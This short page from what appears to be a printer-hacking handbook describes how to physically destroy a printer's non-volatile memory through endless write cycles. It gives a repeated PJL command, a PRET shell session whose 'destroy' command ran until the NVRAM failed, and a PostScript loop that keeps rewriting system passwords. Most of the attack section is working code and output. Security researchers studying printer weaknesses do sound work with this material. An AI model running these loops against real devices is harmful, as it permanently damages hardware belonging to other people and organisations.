# Physical Damage

 Long-term settings for printers and other embedded devices are stored in non-volatile memory \([NVRAM](https://en.wikipedia.org/wiki/Non-volatile_random-access_memory)\) which is traditionally implemented either as [EEPROM](https://en.wikipedia.org/wiki/EEPROM) or as [flash memory](https://en.wikipedia.org/wiki/Flash_memory). Both components have a limited lifetime. Today, vendors of flash memory guarantee about 100,000 rewrites before any write errors may occur.

### PJL

For a practical test to destroy NVRAM write functionality one can continuously set the long-term value for the number of copies with different values for `X`:

```text
@PJL DEFAULT COPIES=X
```

Usually, before stop allowing writing anymore NVRAM parameters are fixed to the factory default value and all variables could still be changed for the current print job using the `@PJL SET...` command.

Using [PRET](https://github.com/RUB-NDS/PRET):

```text
./pret.py -q printer pjl
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.
printer:/> destroy
Warning: This command tries to cause physical damage to the
printer NVRAM. Use at your own risk. Press CTRL+C to abort.
Starting NVRAM write cycle loop in... 10 9 8 7 6 5 4 3 2 1 KABOOM!
Dave, stop. Stop, will you? Stop, Dave. Will you stop, Dave?
[... wait for about 24 hours ...]
I'm afraid. I'm afraid, Dave. Dave, my mind is going...
NVRAM died after 543894 cycles, 18:46:11
```

### PostScript

For PostScript, one needs to find an entry in the currentsystemparams dictionary which survives a reboot \(and therefore must be stored in some kind of NVRAM\). A good candidate would be a PostScript password.  
PostScript can run a script that corrupts its own NVRAM:

```text
/counter 0 def
{ << /Password counter 16 string cvs
     /SystemParamsPassword counter 1 add 16 string cvs
  >> setsystemparams /counter counter 1 add def
} loop
```

**More information about these techniques can be found in** [**http://hacking-printers.net/wiki/index.php/Physical\_damage**](http://hacking-printers.net/wiki/index.php/Physical_damage)\*\*\*\*

